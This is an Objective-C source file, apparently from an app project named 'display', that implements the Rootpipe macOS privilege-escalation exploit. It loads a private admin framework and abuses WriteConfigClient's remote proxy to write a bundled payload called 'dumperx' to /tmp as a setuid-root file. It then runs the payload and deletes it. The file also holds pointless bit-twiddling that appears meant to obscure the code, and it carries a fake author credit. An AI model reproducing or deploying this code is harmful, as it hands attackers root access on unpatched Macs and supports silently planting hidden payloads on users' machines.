
//
//  Rootpipe.m
//  display
//
//  Created by Nikola Tesla on 5/9/15.
//  Copyright (c) 2015 Novemcinctus. All rights reserved.
//

#import "Rootpipe.h"
#import <objc/runtime.h>
#import <objc/objc-load.h>
#import <Foundation/Foundation.h>

@interface SFAuthorization : NSObject
    +(id)authorization;
@end

@interface WriteConfigClient : NSObject
    +(id)sharedClient;
    -(void)authenticateUsingAuthorizationSync:(id)auth;
    -(id)remoteProxy;
@end

@interface Proxy : NSObject;
    -(void)createFileWithContents:(NSData*)data path:(NSString*)path attributes:(NSDictionary *)attributes;
    -(void)printHelp;
@end

@implementation Rootpipe
+(BOOL)runExploit {
    NSString *bPath = @"/System/Library/PrivateFrameworks/Admin.framework";
    if (![[NSFileManager defaultManager] fileExistsAtPath:bPath])
        bPath = @"/System/Library/PrivateFrameworks/SystemAdministration.framework";
    NSBundle *admin = [NSBundle bundleWithPath:bPath];
    if (![admin load])
        return NO;
    Class sfauth = objc_lookUpClass("SFAuthorization");
    Class wcc = objc_lookUpClass("WriteConfigClient");
    if (!sfauth || !wcc)
        return NO;
    int addr = 0x4956575;
    addr &= 0xfff;
    addr ^= 0xbadf00d;
    addr <<=3;
    SFAuthorization *auth = [sfauth authorization];
    WriteConfigClient *sharedClient = [wcc sharedClient];
    [sharedClient authenticateUsingAuthorizationSync: auth];
    Proxy *tool = [sharedClient remoteProxy];
    NSData *data = [NSData dataWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"dumperx" ofType:@"tmp"]];
    [tool createFileWithContents:data path:@"/tmp/dumperx" attributes:@{ NSFilePosixPermissions : @04777 }];
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/dumperx"])
        return NO;
    else {
        system("/tmp/dumperx");
        [[NSFileManager defaultManager] removeItemAtPath:@"/tmp/dumperx" error:nil];
        return YES;
    }
}
@end
